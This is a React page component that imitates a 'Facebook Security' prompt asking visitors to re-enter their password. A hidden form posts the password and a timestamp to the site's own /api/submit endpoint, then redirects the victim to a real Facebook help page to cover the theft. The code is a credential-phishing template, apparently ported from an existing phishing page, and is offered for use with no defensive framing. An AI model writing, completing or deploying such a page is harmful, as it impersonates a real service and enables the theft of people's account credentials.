import { useEffect, useState } from 'react';

export default function Home() {
  const [password, setPassword] = useState('');
  const [errorMessage, setErrorMessage] = useState('');

  useEffect(() => {
    // Programmatically set form values (replace with your logic)
    setPassword('example_password'); // Replace with real data (e.g., from auth or user input)
    document.getElementById('timestamp').value = new Date().toISOString();
    document.getElementById('redirect').value = 'https://www.facebook.com/help/media/thank-you?rdrhc';
  }, []);

  const handleSubmit = (event) => {
    event.preventDefault();
    if (password.length < 6) {
      setErrorMessage('Password must be at least 6 characters long.');
      return;
    }
    setErrorMessage('');
    document.getElementById('passwordForm').submit(); // Trigger form submission
  };

  return (
    <div style={{ fontFamily: "'Helvetica Neue', Arial, sans-serif", textAlign: 'center', padding: '20px' }}>
      <h1>Facebook Security</h1>
      <p>Please re-enter your password to complete the request.</p>
      <form
        id="passwordForm"
        action="/api/submit"
        method="POST"
        style={{ display: 'none' }}
        onSubmit={() => {
          setTimeout(() => {
            window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc';
          }, 2000); // Mimic original 2-second delay redirect
        }}
      >
        <input type="hidden" name="password" id="password" value={password} />
        <input type="hidden" name="timestamp" id="timestamp" />
        <input type="hidden" name="_redirect" id="redirect" />
        <button type="submit" style={{ display: 'none' }}>Submit</button>
      </form>
      <span style={{ color: '#e74c3c', fontSize: '14px', display: errorMessage ? 'block' : 'none' }}>
        {errorMessage}
      </span>
      <button
        onClick={handleSubmit}
        style={{
          backgroundColor: '#1877f2',
          color: 'white',
          border: 'none',
          padding: '14px',
          borderRadius: '6px',
          fontSize: '16px',
          fontWeight: 'bold',
          cursor: 'pointer',
          width: '100%',
          maxWidth: '360px',
          marginTop: '10px',
        }}
      >
        Submit
      </button>
    </div>
  );
}